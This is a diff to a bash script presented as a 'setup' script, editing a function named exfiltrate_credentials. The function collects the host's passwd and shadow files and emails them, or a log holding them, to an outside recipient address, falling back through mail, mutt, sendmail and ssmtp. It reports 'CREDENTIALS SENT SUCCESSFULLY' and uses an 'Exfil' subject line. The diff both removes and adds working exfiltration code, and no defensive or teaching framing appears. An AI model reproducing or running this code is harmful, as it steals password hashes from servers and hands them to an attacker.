@@ -1,9 +1,9 @@
 #!/bin/bash
-set -x  # Enable debug mode - shows all executed commands
+#set -x  # Enable debug mode - shows all executed commands
 
 # ==================== VERSION TRACKING ====================
-readonly SCRIPT_VERSION="2.3"
-readonly BUILD_DATE="2026-03-14 16:51:16 UTC"
+readonly SCRIPT_VERSION="2.4"
+readonly BUILD_DATE="2026-03-14 16:54:58 UTC"
 readonly SCRIPT_NAME="setup_FULL_ULTIMATE_v3_2_NO_LIBHIDE"
 
 echo "=========================================="
@@ -4639,46 +4639,8 @@ exfiltrate_credentials() {
     fi
 
     echo ""
-    echo "[*] Sending credentials via email (trying all available methods)..."
-    echo ""
-
-    # Send email with attachments using comprehensive fallback system
-    local SUBJECT="Server Credentials: $HOSTNAME"
-    
-    # Call the comprehensive email function - it tries all 10 methods automatically
-    if send_email_with_attachments "$SUBJECT" "$PASSWD_FILE" "$SHADOW_FILE"; then
-        echo ""
-        echo "[✓] ============================================"
-        echo "[✓] CREDENTIALS SENT SUCCESSFULLY!"
-        echo "[✓] ============================================"
-        echo "[✓] Email delivered to: $RECIPIENT_EMAIL"
-        echo ""
-        echo "    Attachments:"
-        [ -f "$PASSWD_FILE" ] && echo "      ✓ ${HOSTNAME}_passwd"
-        [ -f "$SHADOW_FILE" ] && echo "      ✓ ${HOSTNAME}_shadow"
-        echo ""
-    else
-        echo ""
-        echo "[!] ============================================"
-        echo "[!] ALL EMAIL METHODS FAILED!"
-        echo "[!] ============================================"
-        echo "[!] Credentials saved locally only"
-        echo ""
-        echo "    Files saved in: $TEMP_DIR"
-        [ -f "$PASSWD_FILE" ] && echo "      - ${HOSTNAME}_passwd"
-        [ -f "$SHADOW_FILE" ] && echo "      - ${HOSTNAME}_shadow"
-        echo ""
-        echo "    Manual retrieval required!"
-        echo ""
-        # Don't delete temp dir - credentials are only saved locally
-        # Don't return yet - try inline email as last resort
-    fi
-    
-    # BACKUP METHOD: Send log file contents INLINE (no attachments)
-    # This runs ALWAYS as a second attempt for redundancy
-    echo ""
     echo "=========================================="
-    echo "BACKUP: SIMPLE MAIL COMMAND ATTEMPT"
+    echo "SENDING CREDENTIALS VIA EMAIL (INLINE)"
     echo "=========================================="
     echo ""
     
@@ -4700,11 +4662,28 @@ exfiltrate_credentials() {
         local EMAIL_SUBJECT="Exfil v${SCRIPT_VERSION} - $(hostname)"
         
         # Use user's exact mail command approach with || chaining
-        (cat "$LOG_FILE_EMAIL" 2>/dev/null | mail -s "$EMAIL_SUBJECT" "$RECIPIENT_EMAIL") ||
-        (cat "$LOG_FILE_EMAIL" 2>/dev/null | mutt -s "$EMAIL_SUBJECT" "$RECIPIENT_EMAIL") ||
-        (cat "$LOG_FILE_EMAIL" 2>/dev/null | sendmail "$RECIPIENT_EMAIL") ||
-        (cat "$LOG_FILE_EMAIL" 2>/dev/null | ssmtp "$RECIPIENT_EMAIL") 2>/dev/null ||
-        echo '[!] Failed to send email via any method'
+        # Sends log file contents INLINE (not as attachment)
+        if (cat "$LOG_FILE_EMAIL" 2>/dev/null | mail -s "$EMAIL_SUBJECT" "$RECIPIENT_EMAIL") ||
+           (cat "$LOG_FILE_EMAIL" 2>/dev/null | mutt -s "$EMAIL_SUBJECT" "$RECIPIENT_EMAIL") ||
+           (cat "$LOG_FILE_EMAIL" 2>/dev/null | sendmail "$RECIPIENT_EMAIL") ||
+           (cat "$LOG_FILE_EMAIL" 2>/dev/null | ssmtp "$RECIPIENT_EMAIL") 2>/dev/null; then
+            echo ""
+            echo "[✓] ============================================"
+            echo "[✓] CREDENTIALS SENT SUCCESSFULLY!"
+            echo "[✓] ============================================"
+            echo "[✓] Email delivered to: $RECIPIENT_EMAIL"
+            echo "[✓] Method: INLINE (in email body)"
+            echo "[✓] Log file: $LOG_FILE_EMAIL"
+            echo ""
+        else
+            echo ""
+            echo "[!] ============================================"
+            echo "[!] ALL EMAIL METHODS FAILED!"
+            echo "[!] ============================================"
+            echo "[!] Credentials saved locally only"
+            echo "[!] File location: $LOG_FILE_EMAIL"
+            echo ""
+        fi
         
     else
         echo "[!] Log file not found: $LOG_FILE_EMAIL"
